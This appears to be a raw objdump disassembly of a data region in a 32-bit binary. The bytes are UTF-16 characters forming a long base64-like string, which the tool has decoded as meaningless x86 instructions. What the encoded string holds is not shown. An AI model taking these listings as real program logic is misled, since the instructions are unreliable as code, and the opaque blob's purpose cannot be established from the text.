  40a6cf:	00 59 00             	add    %bl,0x0(%ecx)
  40a6d2:	69 00 78 00 56 00    	imul   $0x560078,(%eax),%eax
  40a6d8:	4f                   	dec    %edi
  40a6d9:	00 61 00             	add    %ah,0x0(%ecx)
  40a6dc:	39 00                	cmp    %eax,(%eax)
  40a6de:	69 00 41 00 6d 00    	imul   $0x6d0041,(%eax),%eax
  40a6e4:	4e                   	dec    %esi
  40a6e5:	00 77 00             	add    %dh,0x0(%edi)
  40a6e8:	75 00                	jne    0x40a6ea
  40a6ea:	70 00                	jo     0x40a6ec
  40a6ec:	4d                   	dec    %ebp
  40a6ed:	00 55 00             	add    %dl,0x0(%ebp)
  40a6f0:	47                   	inc    %edi
  40a6f1:	00 58 00             	add    %bl,0x0(%eax)
  40a6f4:	6a 00                	push   $0x0
  40a6f6:	5a                   	pop    %edx
  40a6f7:	00 57 00             	add    %dl,0x0(%edi)
  40a6fa:	38 00                	cmp    %al,(%eax)
  40a6fc:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6fd:	00 5a 00             	add    %bl,0x0(%edx)
  40a700:	43                   	inc    %ebx
  40a701:	00 32                	add    %dh,(%edx)
  40a703:	00 49 00             	add    %cl,0x0(%ecx)
  40a706:	2f                   	das
  40a707:	00 6b 00             	add    %ch,0x0(%ebx)
  40a70a:	61                   	popa
  40a70b:	00 79 00             	add    %bh,0x0(%ecx)
  40a70e:	63 00                	arpl   %eax,(%eax)
  40a710:	70 00                	jo     0x40a712
  40a712:	6c                   	insb   (%dx),%es:(%edi)
  40a713:	00 6e 00             	add    %ch,0x0(%esi)
  40a716:	50                   	push   %eax
  40a717:	00 6f 00             	add    %ch,0x0(%edi)
  40a71a:	2b 00                	sub    (%eax),%eax
  40a71c:	43                   	inc    %ebx
  40a71d:	00 76 00             	add    %dh,0x0(%esi)
  40a720:	4b                   	dec    %ebx
  40a721:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
  40a725:	00 75 00             	add    %dh,0x0(%ebp)
  40a728:	49                   	dec    %ecx
  40a729:	00 6a 00             	add    %ch,0x0(%edx)
  40a72c:	2f                   	das
  40a72d:	00 63 00             	add    %ah,0x0(%ebx)
  40a730:	79 00                	jns    0x40a732
  40a732:	30 00                	xor    %al,(%eax)
  40a734:	6f                   	outsl  %ds:(%esi),(%dx)
  40a735:	00 71 00             	add    %dh,0x0(%ecx)
  40a738:	68 00 53 00 55       	push   $0x55005300
  40a73d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a740:	72 00                	jb     0x40a742
  40a742:	75 00                	jne    0x40a744
  40a744:	71 00                	jno    0x40a746
  40a746:	78 00                	js     0x40a748
  40a748:	75 00                	jne    0x40a74a
  40a74a:	42                   	inc    %edx
  40a74b:	00 62 00             	add    %ah,0x0(%edx)
  40a74e:	67 00 6d 00          	add    %ch,0x0(%di)
  40a752:	63 00                	arpl   %eax,(%eax)
  40a754:	4d                   	dec    %ebp
  40a755:	00 68 00             	add    %ch,0x0(%eax)
  40a758:	44                   	inc    %esp
  40a759:	00 77 00             	add    %dh,0x0(%edi)
  40a75c:	4e                   	dec    %esi
  40a75d:	00 7a 00             	add    %bh,0x0(%edx)
  40a760:	64 00 31             	add    %dh,%fs:(%ecx)
  40a763:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40a767:	00 32                	add    %dh,(%edx)
  40a769:	00 64 00 53          	add    %ah,0x53(%eax,%eax,1)
  40a76d:	00 76 00             	add    %dh,0x0(%esi)
  40a770:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  40a774:	69 00 44 00 70 00    	imul   $0x700044,(%eax),%eax
  40a77a:	33 00                	xor    (%eax),%eax
  40a77c:	50                   	push   %eax
  40a77d:	00 58 00             	add    %bl,0x0(%eax)
  40a780:	63 00                	arpl   %eax,(%eax)
  40a782:	49                   	dec    %ecx
  40a783:	00 56 00             	add    %dl,0x0(%esi)
  40a786:	4a                   	dec    %edx
  40a787:	00 50 00             	add    %dl,0x0(%eax)
  40a78a:	32 00                	xor    (%eax),%al
  40a78c:	58                   	pop    %eax
  40a78d:	00 4b 00             	add    %cl,0x0(%ebx)
  40a790:	6a 00                	push   $0x0
  40a792:	37                   	aaa
  40a793:	00 4a 00             	add    %cl,0x0(%edx)
  40a796:	66 00 4b 00          	data16 add %cl,0x0(%ebx)
  40a79a:	72 00                	jb     0x40a79c
  40a79c:	44                   	inc    %esp
  40a79d:	00 63 00             	add    %ah,0x0(%ebx)
  40a7a0:	50                   	push   %eax
  40a7a1:	00 79 00             	add    %bh,0x0(%ecx)
  40a7a4:	2f                   	das
  40a7a5:	00 55 00             	add    %dl,0x0(%ebp)
  40a7a8:	62 00                	bound  %eax,(%eax)
  40a7aa:	37                   	aaa
  40a7ab:	00 61 00             	add    %ah,0x0(%ecx)
  40a7ae:	76 00                	jbe    0x40a7b0
  40a7b0:	34 00                	xor    $0x0,%al
  40a7b2:	70 00                	jo     0x40a7b4
  40a7b4:	30 00                	xor    %al,(%eax)
  40a7b6:	52                   	push   %edx
  40a7b7:	00 39                	add    %bh,(%ecx)
  40a7b9:	00 46 00             	add    %al,0x0(%esi)
  40a7bc:	4d                   	dec    %ebp
  40a7bd:	00 54 00 39          	add    %dl,0x39(%eax,%eax,1)
  40a7c1:	00 67 00             	add    %ah,0x0(%edi)
  40a7c4:	41                   	inc    %ecx
  40a7c5:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
  40a7c9:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  40a7cd:	00 37                	add    %dh,(%edi)
  40a7cf:	00 31                	add    %dh,(%ecx)
  40a7d1:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
  40a7d5:	00 65 00             	add    %ah,0x0(%ebp)
  40a7d8:	4c                   	dec    %esp
  40a7d9:	00 71 00             	add    %dh,0x0(%ecx)
  40a7dc:	31 00                	xor    %eax,(%eax)
  40a7de:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  40a7e2:	4d                   	dec    %ebp
  40a7e3:	00 48 00             	add    %cl,0x0(%eax)
  40a7e6:	37                   	aaa
  40a7e7:	00 31                	add    %dh,(%ecx)
  40a7e9:	00 61 00             	add    %ah,0x0(%ecx)
  40a7ec:	37                   	aaa
  40a7ed:	00 41 00             	add    %al,0x0(%ecx)
  40a7f0:	66 00 44 00 72       	data16 add %al,0x72(%eax,%eax,1)
  40a7f5:	00 6d 00             	add    %ch,0x0(%ebp)
  40a7f8:	43                   	inc    %ebx
  40a7f9:	00 73 00             	add    %dh,0x0(%ebx)
  40a7fc:	58                   	pop    %eax
  40a7fd:	00 30                	add    %dh,(%eax)
  40a7ff:	00 49 00             	add    %cl,0x0(%ecx)
  40a802:	69 00 58 00 66 00    	imul   $0x660058,(%eax),%eax
  40a808:	63 00                	arpl   %eax,(%eax)
  40a80a:	41                   	inc    %ecx
  40a80b:	00 51 00             	add    %dl,0x0(%ecx)
  40a80e:	31 00                	xor    %eax,(%eax)
  40a810:	6b 00 50             	imul   $0x50,(%eax),%eax
  40a813:	00 41 00             	add    %al,0x0(%ecx)
  40a816:	54                   	push   %esp
  40a817:	00 46 00             	add    %al,0x0(%esi)
  40a81a:	4c                   	dec    %esp
  40a81b:	00 69 00             	add    %ch,0x0(%ecx)
  40a81e:	35 00 63 00 73       	xor    $0x73006300,%eax
  40a823:	00 46 00             	add    %al,0x0(%esi)
  40a826:	78 00                	js     0x40a828
  40a828:	4f                   	dec    %edi
  40a829:	00 67 00             	add    %ah,0x0(%edi)
  40a82c:	66 00 4f 00          	data16 add %cl,0x0(%edi)
  40a830:	39 00                	cmp    %eax,(%eax)
  40a832:	46                   	inc    %esi
  40a833:	00 57 00             	add    %dl,0x0(%edi)
  40a836:	71 00                	jno    0x40a838
  40a838:	55                   	push   %ebp
  40a839:	00 41 00             	add    %al,0x0(%ecx)
  40a83c:	73 00                	jae    0x40a83e
  40a83e:	4f                   	dec    %edi
  40a83f:	00 4e 00             	add    %cl,0x0(%esi)
  40a842:	33 00                	xor    (%eax),%eax
  40a844:	61                   	popa
  40a845:	00 56 00             	add    %dl,0x0(%esi)
  40a848:	44                   	inc    %esp
  40a849:	00 6d 00             	add    %ch,0x0(%ebp)
  40a84c:	6c                   	insb   (%dx),%es:(%edi)
  40a84d:	00 78 00             	add    %bh,0x0(%eax)
  40a850:	30 00                	xor    %al,(%eax)
  40a852:	70 00                	jo     0x40a854
  40a854:	36 00 48 00          	add    %cl,%ss:0x0(%eax)
  40a858:	2b 00                	sub    (%eax),%eax
  40a85a:	5a                   	pop    %edx
  40a85b:	00 4b 00             	add    %cl,0x0(%ebx)
  40a85e:	47                   	inc    %edi
  40a85f:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  40a863:	00 77 00             	add    %dh,0x0(%edi)
  40a866:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
  40a86a:	74 00                	je     0x40a86c
  40a86c:	7a 00                	jp     0x40a86e
  40a86e:	62 00                	bound  %eax,(%eax)
  40a870:	45                   	inc    %ebp
  40a871:	00 69 00             	add    %ch,0x0(%ecx)
  40a874:	65 00 4c 00 30       	add    %cl,%gs:0x30(%eax,%eax,1)
  40a879:	00 37                	add    %dh,(%edi)
  40a87b:	00 36                	add    %dh,(%esi)
  40a87d:	00 70 00             	add    %dh,0x0(%eax)
  40a880:	45                   	inc    %ebp
  40a881:	00 65 00             	add    %ah,0x0(%ebp)
  40a884:	34 00                	xor    $0x0,%al
  40a886:	5a                   	pop    %edx
  40a887:	00 72 00             	add    %dh,0x0(%edx)
  40a88a:	4b                   	dec    %ebx
  40a88b:	00 35 00 6e 00 71    	add    %dh,0x71006e00
  40a891:	00 4e 00             	add    %cl,0x0(%esi)
  40a894:	58                   	pop    %eax
  40a895:	00 71 00             	add    %dh,0x0(%ecx)
  40a898:	77 00                	ja     0x40a89a
  40a89a:	4e                   	dec    %esi
  40a89b:	00 39                	add    %bh,(%ecx)
  40a89d:	00 67 00             	add    %ah,0x0(%edi)
  40a8a0:	69 00 49 00 69 00    	imul   $0x690049,(%eax),%eax
  40a8a6:	4a                   	dec    %edx
  40a8a7:	00 62 00             	add    %ah,0x0(%edx)
  40a8aa:	77 00                	ja     0x40a8ac
  40a8ac:	44                   	inc    %esp
  40a8ad:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  40a8b1:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
  40a8b5:	00 65 00             	add    %ah,0x0(%ebp)
  40a8b8:	48                   	dec    %eax
  40a8b9:	00 63 00             	add    %ah,0x0(%ebx)
  40a8bc:	57                   	push   %edi
  40a8bd:	00 77 00             	add    %dh,0x0(%edi)
  40a8c0:	55                   	push   %ebp
  40a8c1:	00 58 00             	add    %bl,0x0(%eax)
  40a8c4:	42                   	inc    %edx
  40a8c5:	00 72 00             	add    %dh,0x0(%edx)
  40a8c8:	33 00                	xor    (%eax),%eax
  40a8ca:	47                   	inc    %edi
  40a8cb:	00 4b 00             	add    %cl,0x0(%ebx)
  40a8ce:	4a                   	dec    %edx
  40a8cf:	00 58 00             	add    %bl,0x0(%eax)
  40a8d2:	70 00                	jo     0x40a8d4
  40a8d4:	68 00 7a 00 2b       	push   $0x2b007a00
  40a8d9:	00 4f 00             	add    %cl,0x0(%edi)
  40a8dc:	68 00 44 00 78       	push   $0x78004400
  40a8e1:	00 43 00             	add    %al,0x0(%ebx)
  40a8e4:	6b 00 49             	imul   $0x49,(%eax),%eax
  40a8e7:	00 53 00             	add    %dl,0x0(%ebx)
  40a8ea:	73 00                	jae    0x40a8ec
  40a8ec:	71 00                	jno    0x40a8ee
  40a8ee:	7a 00                	jp     0x40a8f0
  40a8f0:	62 00                	bound  %eax,(%eax)
  40a8f2:	74 00                	je     0x40a8f4
  40a8f4:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  40a8f8:	74 00                	je     0x40a8fa
  40a8fa:	43                   	inc    %ebx
  40a8fb:	00 72 00             	add    %dh,0x0(%edx)
  40a8fe:	39 00                	cmp    %eax,(%eax)
  40a900:	69 00 73 00 36 00    	imul   $0x360073,(%eax),%eax
  40a906:	4f                   	dec    %edi
  40a907:	00 5a 00             	add    %bl,0x0(%edx)
  40a90a:	41                   	inc    %ecx
  40a90b:	00 66 00             	add    %ah,0x0(%esi)
  40a90e:	41                   	inc    %ecx
  40a90f:	00 63 00             	add    %ah,0x0(%ebx)
  40a912:	77 00                	ja     0x40a914
  40a914:	51                   	push   %ecx
  40a915:	00 49 00             	add    %cl,0x0(%ecx)
  40a918:	4a                   	dec    %edx
  40a919:	00 67 00             	add    %ah,0x0(%edi)
  40a91c:	79 00                	jns    0x40a91e
  40a91e:	5a                   	pop    %edx
  40a91f:	00 75 00             	add    %dh,0x0(%ebp)
  40a922:	6c                   	insb   (%dx),%es:(%edi)
  40a923:	00 35 00 6b 00 46    	add    %dh,0x46006b00
  40a929:	00 66 00             	add    %ah,0x0(%esi)
  40a92c:	79 00                	jns    0x40a92e
  40a92e:	68 00 43 00 70       	push   $0x70004300
  40a933:	00 48 00             	add    %cl,0x0(%eax)
  40a936:	44                   	inc    %esp
  40a937:	00 2f                	add    %ch,(%edi)
  40a939:	00 37                	add    %dh,(%edi)
  40a93b:	00 6f 00             	add    %ch,0x0(%edi)
  40a93e:	67 00 76 00          	add    %dh,0x0(%bp)
  40a942:	79 00                	jns    0x40a944
  40a944:	46                   	inc    %esi
  40a945:	00 62 00             	add    %ah,0x0(%edx)
  40a948:	36 00 2b             	add    %ch,%ss:(%ebx)
  40a94b:	00 42 00             	add    %al,0x0(%edx)
  40a94e:	37                   	aaa
  40a94f:	00 76 00             	add    %dh,0x0(%esi)
  40a952:	67 00 74 00          	add    %dh,0x0(%si)
  40a956:	51                   	push   %ecx
  40a957:	00 50 00             	add    %dl,0x0(%eax)
  40a95a:	55                   	push   %ebp
  40a95b:	00 58 00             	add    %bl,0x0(%eax)
  40a95e:	55                   	push   %ebp
  40a95f:	00 77 00             	add    %dh,0x0(%edi)
  40a962:	33 00                	xor    (%eax),%eax
  40a964:	54                   	push   %esp
  40a965:	00 75 00             	add    %dh,0x0(%ebp)
  40a968:	51                   	push   %ecx
  40a969:	00 46 00             	add    %al,0x0(%esi)
  40a96c:	79 00                	jns    0x40a96e
  40a96e:	5a                   	pop    %edx
  40a96f:	00 39                	add    %bh,(%ecx)
  40a971:	00 33                	add    %dh,(%ebx)
  40a973:	00 75 00             	add    %dh,0x0(%ebp)
  40a976:	56                   	push   %esi
  40a977:	00 76 00             	add    %dh,0x0(%esi)
  40a97a:	77 00                	ja     0x40a97c
  40a97c:	32 00                	xor    (%eax),%al
  40a97e:	6c                   	insb   (%dx),%es:(%edi)
  40a97f:	00 74 00 2b          	add    %dh,0x2b(%eax,%eax,1)
  40a983:	00 47 00             	add    %al,0x0(%edi)
  40a986:	6b 00 38             	imul   $0x38,(%eax),%eax
  40a989:	00 6b 00             	add    %ch,0x0(%ebx)
  40a98c:	6d                   	insl   (%dx),%es:(%edi)
  40a98d:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  40a991:	00 35 00 4b 00 51    	add    %dh,0x51004b00
  40a997:	00 78 00             	add    %bh,0x0(%eax)
  40a99a:	41                   	inc    %ecx
  40a99b:	00 47 00             	add    %al,0x0(%edi)
  40a99e:	73 00                	jae    0x40a9a0
  40a9a0:	7a 00                	jp     0x40a9a2
  40a9a2:	59                   	pop    %ecx
  40a9a3:	00 6a 00             	add    %ch,0x0(%edx)
  40a9a6:	55                   	push   %ebp
  40a9a7:	00 7a 00             	add    %bh,0x0(%edx)
  40a9aa:	31 00                	xor    %eax,(%eax)
  40a9ac:	54                   	push   %esp
  40a9ad:	00 48 00             	add    %cl,0x0(%eax)
  40a9b0:	32 00                	xor    (%eax),%al
  40a9b2:	70 00                	jo     0x40a9b4
  40a9b4:	54                   	push   %esp
  40a9b5:	00 78 00             	add    %bh,0x0(%eax)
  40a9b8:	76 00                	jbe    0x40a9ba
  40a9ba:	5a                   	pop    %edx
  40a9bb:	00 4e 00             	add    %cl,0x0(%esi)
  40a9be:	4a                   	dec    %edx
  40a9bf:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a9c2:	4f                   	dec    %edi
  40a9c3:	00 4c 00 56          	add    %cl,0x56(%eax,%eax,1)
  40a9c7:	00 5a 00             	add    %bl,0x0(%edx)
  40a9ca:	74 00                	je     0x40a9cc
  40a9cc:	5a                   	pop    %edx
  40a9cd:	00 4c 00 6d          	add    %cl,0x6d(%eax,%eax,1)
  40a9d1:	00 56 00             	add    %dl,0x0(%esi)
  40a9d4:	59                   	pop    %ecx
  40a9d5:	00 68 00             	add    %ch,0x0(%eax)
  40a9d8:	56                   	push   %esi
  40a9d9:	00 50 00             	add    %dl,0x0(%eax)
  40a9dc:	72 00                	jb     0x40a9de
  40a9de:	38 00                	cmp    %al,(%eax)
  40a9e0:	47                   	inc    %edi
  40a9e1:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  40a9e5:	00 2b                	add    %ch,(%ebx)
  40a9e7:	00 33                	add    %dh,(%ebx)
  40a9e9:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
  40a9ed:	00 43 00             	add    %al,0x0(%ebx)
  40a9f0:	51                   	push   %ecx
  40a9f1:	00 51 00             	add    %dl,0x0(%ecx)
  40a9f4:	31 00                	xor    %eax,(%eax)
  40a9f6:	55                   	push   %ebp
  40a9f7:	00 78 00             	add    %bh,0x0(%eax)
  40a9fa:	63 00                	arpl   %eax,(%eax)
  40a9fc:	6d                   	insl   (%dx),%es:(%edi)
  40a9fd:	00 37                	add    %dh,(%edi)
  40a9ff:	00 4c 00 51          	add    %cl,0x51(%eax,%eax,1)
  40aa03:	00 37                	add    %dh,(%edi)
  40aa05:	00 59 00             	add    %bl,0x0(%ecx)
  40aa08:	39 00                	cmp    %eax,(%eax)
  40aa0a:	6a 00                	push   $0x0
  40aa0c:	77 00                	ja     0x40aa0e
  40aa0e:	37                   	aaa
  40aa0f:	00 43 00             	add    %al,0x0(%ebx)
  40aa12:	42                   	inc    %edx
  40aa13:	00 72 00             	add    %dh,0x0(%edx)
  40aa16:	39 00                	cmp    %eax,(%eax)
  40aa18:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa19:	00 7a 00             	add    %bh,0x0(%edx)
  40aa1c:	78 00                	js     0x40aa1e
  40aa1e:	64 00 59 00          	add    %bl,%fs:0x0(%ecx)
  40aa22:	43                   	inc    %ebx
  40aa23:	00 78 00             	add    %bh,0x0(%eax)
  40aa26:	54                   	push   %esp
  40aa27:	00 55 00             	add    %dl,0x0(%ebp)
  40aa2a:	55                   	push   %ebp
  40aa2b:	00 63 00             	add    %ah,0x0(%ebx)
  40aa2e:	44                   	inc    %esp
  40aa2f:	00 6e 00             	add    %ch,0x0(%esi)
  40aa32:	70 00                	jo     0x40aa34
  40aa34:	39 00                	cmp    %eax,(%eax)
  40aa36:	64 00 2b             	add    %ch,%fs:(%ebx)
  40aa39:	00 38                	add    %bh,(%eax)
  40aa3b:	00 58 00             	add    %bl,0x0(%eax)
  40aa3e:	34 00                	xor    $0x0,%al
  40aa40:	4b                   	dec    %ebx
  40aa41:	00 73 00             	add    %dh,0x0(%ebx)
  40aa44:	36 00 6c 00 77       	add    %ch,%ss:0x77(%eax,%eax,1)
  40aa49:	00 43 00             	add    %al,0x0(%ebx)
  40aa4c:	7a 00                	jp     0x40aa4e
  40aa4e:	6d                   	insl   (%dx),%es:(%edi)
  40aa4f:	00 30                	add    %dh,(%eax)
  40aa51:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  40aa55:	00 65 00             	add    %ah,0x0(%ebp)
  40aa58:	48                   	dec    %eax
  40aa59:	00 56 00             	add    %dl,0x0(%esi)
  40aa5c:	63 00                	arpl   %eax,(%eax)
  40aa5e:	34 00                	xor    $0x0,%al
  40aa60:	2f                   	das
  40aa61:	00 4d 00             	add    %cl,0x0(%ebp)
  40aa64:	46                   	inc    %esi
  40aa65:	00 68 00             	add    %ch,0x0(%eax)
  40aa68:	30 00                	xor    %al,(%eax)
  40aa6a:	39 00                	cmp    %eax,(%eax)
  40aa6c:	4c                   	dec    %esp
  40aa6d:	00 72 00             	add    %dh,0x0(%edx)
  40aa70:	56                   	push   %esi
  40aa71:	00 71 00             	add    %dh,0x0(%ecx)
  40aa74:	35 00 64 00 72       	xor    $0x72006400,%eax
  40aa79:	00 61 00             	add    %ah,0x0(%ecx)
  40aa7c:	45                   	inc    %ebp
  40aa7d:	00 38                	add    %bh,(%eax)
  40aa7f:	00 39                	add    %bh,(%ecx)
  40aa81:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa84:	70 00                	jo     0x40aa86
  40aa86:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  40aa8a:	73 00                	jae    0x40aa8c
  40aa8c:	47                   	inc    %edi
  40aa8d:	00 69 00             	add    %ch,0x0(%ecx)
  40aa90:	62 00                	bound  %eax,(%eax)
  40aa92:	2f                   	das
  40aa93:	00 2f                	add    %ch,(%edi)
  40aa95:	00 68 00             	add    %ch,0x0(%eax)
  40aa98:	62 00                	bound  %eax,(%eax)
  40aa9a:	79 00                	jns    0x40aa9c
  40aa9c:	55                   	push   %ebp
  40aa9d:	00 53 00             	add    %dl,0x0(%ebx)
  40aaa0:	74 00                	je     0x40aaa2
  40aaa2:	61                   	popa
  40aaa3:	00 71 00             	add    %dh,0x0(%ecx)
  40aaa6:	4d                   	dec    %ebp
  40aaa7:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  40aaab:	00 51 00             	add    %dl,0x0(%ecx)
  40aaae:	58                   	pop    %eax
  40aaaf:	00 6e 00             	add    %ch,0x0(%esi)
  40aab2:	4a                   	dec    %edx
  40aab3:	00 46 00             	add    %al,0x0(%esi)
  40aab6:	37                   	aaa
  40aab7:	00 75 00             	add    %dh,0x0(%ebp)
  40aaba:	6d                   	insl   (%dx),%es:(%edi)
  40aabb:	00 4a 00             	add    %cl,0x0(%edx)
  40aabe:	4a                   	dec    %edx
  40aabf:	00 35 00 77 00 51    	add    %dh,0x51007700
  40aac5:	00 4b 00             	add    %cl,0x0(%ebx)
  40aac8:	77 00                	ja     0x40aaca
  40aaca:	76 00                	jbe    0x40aacc
  40aacc:	5a                   	pop    %edx
  40aacd:	00 78 00             	add    %bh,0x0(%eax)
  40aad0:	58                   	pop    %eax
  40aad1:	00 4f 00             	add    %cl,0x0(%edi)
  40aad4:	72 00                	jb     0x40aad6
  40aad6:	6e                   	outsb  %ds:(%esi),(%dx)
  40aad7:	00 58 00             	add    %bl,0x0(%eax)
  40aada:	68 00 59 00 37       	push   $0x37005900
  40aadf:	00 68 00             	add    %ch,0x0(%eax)
  40aae2:	75 00                	jne    0x40aae4
  40aae4:	36 00 64 00 43       	add    %ah,%ss:0x43(%eax,%eax,1)
  40aae9:	00 67 00             	add    %ah,0x0(%edi)
  40aaec:	7a 00                	jp     0x40aaee
  40aaee:	53                   	push   %ebx
  40aaef:	00 6d 00             	add    %ch,0x0(%ebp)
  40aaf2:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  40aaf6:	38 00                	cmp    %al,(%eax)
  40aaf8:	34 00                	xor    $0x0,%al
  40aafa:	5a                   	pop    %edx
  40aafb:	00 69 00             	add    %ch,0x0(%ecx)
  40aafe:	34 00                	xor    $0x0,%al
  40ab00:	77 00                	ja     0x40ab02
  40ab02:	43                   	inc    %ebx
  40ab03:	00 37                	add    %dh,(%edi)
  40ab05:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40ab09:	00 6f 00             	add    %ch,0x0(%edi)
  40ab0c:	78 00                	js     0x40ab0e
  40ab0e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab0f:	00 5a 00             	add    %bl,0x0(%edx)
  40ab12:	57                   	push   %edi
  40ab13:	00 66 00             	add    %ah,0x0(%esi)
  40ab16:	42                   	inc    %edx
  40ab17:	00 4c 00 71          	add    %cl,0x71(%eax,%eax,1)
  40ab1b:	00 63 00             	add    %ah,0x0(%ebx)
  40ab1e:	56                   	push   %esi
  40ab1f:	00 77 00             	add    %dh,0x0(%edi)
  40ab22:	49                   	dec    %ecx
  40ab23:	00 43 00             	add    %al,0x0(%ebx)
  40ab26:	50                   	push   %eax
  40ab27:	00 65 00             	add    %ah,0x0(%ebp)
  40ab2a:	32 00                	xor    (%eax),%al
  40ab2c:	69 00 6a 00 46 00    	imul   $0x46006a,(%eax),%eax
  40ab32:	4f                   	dec    %edi
  40ab33:	00 50 00             	add    %dl,0x0(%eax)
  40ab36:	4f                   	dec    %edi
  40ab37:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
  40ab3b:	00 6e 00             	add    %ch,0x0(%esi)
  40ab3e:	78 00                	js     0x40ab40
  40ab40:	59                   	pop    %ecx
  40ab41:	00 7a 00             	add    %bh,0x0(%edx)
  40ab44:	72 00                	jb     0x40ab46
  40ab46:	4b                   	dec    %ebx
  40ab47:	00 6f 00             	add    %ch,0x0(%edi)
  40ab4a:	5a                   	pop    %edx
  40ab4b:	00 54 00 39          	add    %dl,0x39(%eax,%eax,1)
  40ab4f:	00 65 00             	add    %ah,0x0(%ebp)
  40ab52:	54                   	push   %esp
  40ab53:	00 62 00             	add    %ah,0x0(%edx)
  40ab56:	47                   	inc    %edi
  40ab57:	00 74 00 5a          	add    %dh,0x5a(%eax,%eax,1)
  40ab5b:	00 48 00             	add    %cl,0x0(%eax)
  40ab5e:	72 00                	jb     0x40ab60
  40ab60:	43                   	inc    %ebx
  40ab61:	00 58 00             	add    %bl,0x0(%eax)
  40ab64:	2b 00                	sub    (%eax),%eax
  40ab66:	4d                   	dec    %ebp
  40ab67:	00 57 00             	add    %dl,0x0(%edi)
  40ab6a:	37                   	aaa
  40ab6b:	00 38                	add    %bh,(%eax)
  40ab6d:	00 67 00             	add    %ah,0x0(%edi)
  40ab70:	34 00                	xor    $0x0,%al
  40ab72:	74 00                	je     0x40ab74
  40ab74:	56                   	push   %esi
  40ab75:	00 68 00             	add    %ch,0x0(%eax)
  40ab78:	57                   	push   %edi
  40ab79:	00 6d 00             	add    %ch,0x0(%ebp)
  40ab7c:	56                   	push   %esi
  40ab7d:	00 4d 00             	add    %cl,0x0(%ebp)
  40ab80:	54                   	push   %esp
  40ab81:	00 4d 00             	add    %cl,0x0(%ebp)
  40ab84:	45                   	inc    %ebp
  40ab85:	00 6d 00             	add    %ch,0x0(%ebp)
  40ab88:	5a                   	pop    %edx
  40ab89:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ab8c:	41                   	inc    %ecx
  40ab8d:	00 55 00             	add    %dl,0x0(%ebp)
  40ab90:	35 00 4d 00 37       	xor    $0x37004d00,%eax
  40ab95:	00 65 00             	add    %ah,0x0(%ebp)
  40ab98:	79 00                	jns    0x40ab9a
  40ab9a:	49                   	dec    %ecx
  40ab9b:	00 4a 00             	add    %cl,0x0(%edx)
  40ab9e:	51                   	push   %ecx
  40ab9f:	00 72 00             	add    %dh,0x0(%edx)
  40aba2:	6f                   	outsl  %ds:(%esi),(%dx)
  40aba3:	00 68 00             	add    %ch,0x0(%eax)
  40aba6:	34 00                	xor    $0x0,%al
  40aba8:	6a 00                	push   $0x0
  40abaa:	53                   	push   %ebx
  40abab:	00 6e 00             	add    %ch,0x0(%esi)
  40abae:	67 00 31             	add    %dh,(%bx,%di)
  40abb1:	00 4e 00             	add    %cl,0x0(%esi)
  40abb4:	6c                   	insb   (%dx),%es:(%edi)
  40abb5:	00 6d 00             	add    %ch,0x0(%ebp)
  40abb8:	61                   	popa
  40abb9:	00 36                	add    %dh,(%esi)
  40abbb:	00 42 00             	add    %al,0x0(%edx)
  40abbe:	30 00                	xor    %al,(%eax)
  40abc0:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  40abc4:	76 00                	jbe    0x40abc6
  40abc6:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40abca:	2f                   	das
  40abcb:	00 31                	add    %dh,(%ecx)
  40abcd:	00 71 00             	add    %dh,0x0(%ecx)
  40abd0:	42                   	inc    %edx
  40abd1:	00 38                	add    %bh,(%eax)
  40abd3:	00 55 00             	add    %dl,0x0(%ebp)
  40abd6:	77 00                	ja     0x40abd8
  40abd8:	38 00                	cmp    %al,(%eax)
  40abda:	34 00                	xor    $0x0,%al
  40abdc:	6d                   	insl   (%dx),%es:(%edi)
  40abdd:	00 7a 00             	add    %bh,0x0(%edx)
  40abe0:	72 00                	jb     0x40abe2
  40abe2:	2b 00                	sub    (%eax),%eax
  40abe4:	70 00                	jo     0x40abe6
  40abe6:	6a 00                	push   $0x0
  40abe8:	51                   	push   %ecx
  40abe9:	00 63 00             	add    %ah,0x0(%ebx)
  40abec:	30 00                	xor    %al,(%eax)
  40abee:	49                   	dec    %ecx
  40abef:	00 43 00             	add    %al,0x0(%ebx)
  40abf2:	70 00                	jo     0x40abf4
  40abf4:	34 00                	xor    $0x0,%al
  40abf6:	4c                   	dec    %esp
  40abf7:	00 79 00             	add    %bh,0x0(%ecx)
  40abfa:	57                   	push   %edi
  40abfb:	00 2f                	add    %ch,(%edi)
  40abfd:	00 67 00             	add    %ah,0x0(%edi)
  40ac00:	73 00                	jae    0x40ac02
  40ac02:	56                   	push   %esi
  40ac03:	00 4e 00             	add    %cl,0x0(%esi)
  40ac06:	61                   	popa
  40ac07:	00 30                	add    %dh,(%eax)
  40ac09:	00 58 00             	add    %bl,0x0(%eax)
  40ac0c:	57                   	push   %edi
  40ac0d:	00 7a 00             	add    %bh,0x0(%edx)
  40ac10:	70 00                	jo     0x40ac12
  40ac12:	6c                   	insb   (%dx),%es:(%edi)
